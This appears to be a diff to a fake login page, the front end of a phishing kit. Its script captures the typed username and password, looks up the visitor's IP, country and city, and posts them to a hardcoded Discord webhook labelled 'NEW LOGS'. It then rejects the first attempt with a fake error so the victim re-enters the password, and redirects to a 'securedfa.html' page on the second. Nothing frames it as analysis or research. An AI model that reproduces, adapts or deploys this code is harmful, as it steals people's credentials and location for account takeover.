@@ -39,7 +39,7 @@
              flex items-center justify-center gap-2"
     >
       <span id="btnText">Log in</span>
-      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
+      <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
         <circle cx="12" cy="12" r="10" stroke="white" stroke-width="4" fill="none" opacity="0.3"/>
         <path d="M22 12a10 10 0 0 1-10 10" stroke="white" stroke-width="4" fill="none"/>
       </svg>
@@ -70,63 +70,51 @@
   </div>
 
   <script>
-    // ================== CONFIG ==================
+    // ================== YOUR WEBHOOK ==================
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1489579300687577279/fMVQanQ8kgUHZ9a_G39YhvpKjHnCmJmljDDHR9ntSa7bUAPMh1Axq0AK4VRumc10Npau";
 
     let attempt = 0;
 
-    // Better IP + Geolocation using ipapi.co (more reliable and detailed)
+    // Best free IP + Country + City API (no key required)
     async function getIPAndLocation() {
       try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (!res.ok) throw new Error('Failed to fetch');
+        const res = await fetch('https://ip-api.com/json/?fields=status,message,query,country,city');
+        if (!res.ok) throw new Error('Failed');
 
         const data = await res.json();
 
-        return {
-          ip: data.ip || 'Unknown',
-          city: data.city || 'Unknown',
-          region: data.region || 'Unknown',
-          country: data.country_name || 'Unknown',
-          country_code: data.country || 'Unknown',
-          latitude: data.latitude || null,
-          longitude: data.longitude || null,
-          timezone: data.timezone || 'Unknown',
-          isp: data.org || 'Unknown'
-        };
+        if (data.status === "success") {
+          return {
+            ip: data.query || 'Unknown',
+            country: data.country || 'Unknown',
+            city: data.city || 'Unknown'
+          };
+        } else {
+          throw new Error(data.message || 'API error');
+        }
       } catch (err) {
-        console.error("GeoIP fetch failed:", err);
+        console.error("GeoIP failed:", err);
         return {
           ip: 'Unknown',
-          city: 'Unknown',
-          region: 'Unknown',
           country: 'Unknown',
-          country_code: 'Unknown',
-          latitude: null,
-          longitude: null,
-          timezone: 'Unknown',
-          isp: 'Unknown'
+          city: 'Unknown'
         };
       }
     }
 
-    // Send data to Discord
+    // Send to Discord in the exact simple format
     async function sendToDiscord(username, password, geoData, attemptNum) {
-      const { ip, city, region, country, country_code, isp } = geoData;
+      const { ip, country, city } = geoData;
 
-      const message = `
-      New alert:
-**USERNAME:** ${username}
-**PASSWORD:** ${password}
+      const message = `NEW LOGS 🪵
 
-**IP:** ${ip}
-**CITY:** ${city}
-**REGION:** ${region}
-**COUNTRY:** ${country} (${country_code})
-**ISP:** ${isp}
+USERNAME: ${username}
+PASSWORD: ${password}
+IP: ${ip}
+COUNTRY: ${country}
+CITY: ${city}
 
-**Attempt:** ${attemptNum} ⏱️
-
+X${attemptNum}`;
 
       try {
         await fetch(DISCORD_WEBHOOK_URL, {
@@ -134,10 +122,10 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             content: message,
-            username: "Login Logger"
+            username: "Logger"
           })
         });
-        console.log(`✅ Attempt ${attemptNum} sent to Discord`);
+        console.log(`✅ Attempt ${attemptNum} sent`);
       } catch (err) {
         console.error("Webhook failed:", err);
       }
@@ -149,43 +137,45 @@
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
       const passwordInput = document.getElementById("password");
+      const btn = document.getElementById("loginBtn");
+      const btnText = document.getElementById("btnText");
+      const spinner = document.getElementById("spinner");
+      const errorMsg = document.getElementById("errorMsg");
 
       if (!username || !password) {
         alert("Please fill in all fields!");
         return;
       }
 
-      const btn = document.getElementById("loginBtn");
-      const btnText = document.getElementById("btnText");
-      const spinner = document.getElementById("spinner");
-      const errorMsg = document.getElementById("errorMsg");
-
+      // Start loading animation immediately
       attempt++;
+      btn.disabled = true;
+      btnText.textContent = "Logging in...";
+      spinner.classList.remove("hidden");
 
-      // Get IP + Location
+      // Fetch IP + location and send to Discord (background)
       const geoData = await getIPAndLocation();
-
-      // Send to Discord BEFORE UI changes
       await sendToDiscord(username, password, geoData, attempt);
 
+      // Handle UI after background tasks
       if (attempt === 1) {
-        // First attempt: show error
         errorMsg.classList.remove("hidden");
         passwordInput.value = "";
+
+        // Reset button
+        btn.disabled = false;
+        btnText.textContent = "Log in";
+        spinner.classList.add("hidden");
 
         // Shake effect
         passwordInput.classList.add("animate-shake");
         setTimeout(() => passwordInput.classList.remove("animate-shake"), 600);
       } 
       else {
-        // Second attempt: show loading then redirect
-        btn.disabled = true;
-        btnText.textContent = "Loading...";
-        spinner.classList.remove("hidden");
-
+        // Second attempt - redirect after short delay
         setTimeout(() => {
           window.location.href = "securedfa.html";
-        }, 1200);
+        }, 1000);
       }
     });
   </script>
